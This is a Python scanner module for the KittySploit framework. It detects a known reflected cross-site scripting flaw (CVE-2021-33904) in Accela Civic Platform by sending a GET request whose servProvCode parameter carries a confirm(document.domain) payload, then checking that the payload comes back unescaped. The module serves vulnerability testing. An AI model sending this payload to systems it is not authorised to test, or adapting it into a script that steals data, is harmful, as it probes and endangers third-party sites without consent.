#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Accela Civic Platform through 21."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Accela Civic Platform <=21.1 - Cross-Site Scripting Detection',
        'description': 'Accela Civic Platform through 21.1 contains a cross-site scripting vulnerability via the security/hostSignon.do parameter servProvCode.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'accela', 'xss', 'edb', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/49980',
            'https://gist.github.com/0xx7/3d934939d7122fe23db11bc48eda9d21',
            'http://packetstormsecurity.com/files/163093/Accela-Civic-Platorm-21.1-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-33904',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-33904',
    }

    def run(self):
        r = self.http_request(method="GET", path='/security/hostSignon.do?hostSignOn=true&servProvCode=k3woq%22%5econfirm(document.domain)%5e%22a2pbrnzx5a9', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"k3woq"^confirm(document.domain)^"a2pbrnzx5a9"', 'servProvCode',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Accela Civic Platform <=21.1 - Cross-Site Scripting detected",
                path='/security/hostSignon.do?hostSignOn=true&servProvCode=k3woq%22%5econfirm(document.domain)%5e%22a2pbrnzx5a9',
            )
            return True
        return False

